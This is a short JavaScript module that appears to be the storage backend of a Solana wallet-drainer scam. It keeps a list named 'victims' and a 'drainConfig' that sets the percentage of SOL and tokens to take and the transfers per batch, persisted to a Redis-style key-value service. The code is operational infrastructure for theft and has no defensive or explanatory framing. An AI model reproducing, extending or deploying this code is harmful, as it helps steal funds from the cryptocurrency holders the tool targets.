const mem = {
  victims: [],
  drainConfig: {
    solReserve: 500000,
    solPercentage: 100,
    tokenReserve: 0,
    maxPerTx: 24,
    enabled: true
  }
};

const KV_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL || '';
const KV_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN || '';
const useKV = !!(KV_URL && KV_TOKEN);

async function kvCmd(cmd) {
  const r = await fetch(KV_URL, {
    method: 'POST',
    headers: {
      Authorization: 'Bearer ' + KV_TOKEN,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(cmd)
  });
  const j = await r.json();
  return j.result;
}

async function kvGet(key) {
  try {
    const raw = await kvCmd(['GET', key]);
    return raw ? JSON.parse(raw) : null;
  } catch (e) { return null; }
}

async function kvSet(key, val) {
  try { await kvCmd(['SET', key, JSON.stringify(val)]); } catch (e) {}
}

async function getVictims() {
  if (!useKV) return mem.victims;
  const v = await kvGet('victims');
  return Array.isArray(v) ? v : [];
}

async function setVictims(arr) {
  if (!useKV) { mem.victims = arr; return; }
  await kvSet('victims', arr);
}

async function getConfig() {
  if (!useKV) return mem.drainConfig;
  const c = await kvGet('config');
  return c && typeof c === 'object' ? c : mem.drainConfig;
}

async function setConfig(cfg) {
  if (!useKV) { mem.drainConfig = cfg; return; }
  await kvSet('config', cfg);
}

module.exports = { getVictims, setVictims, getConfig, setConfig, useKV, mem };
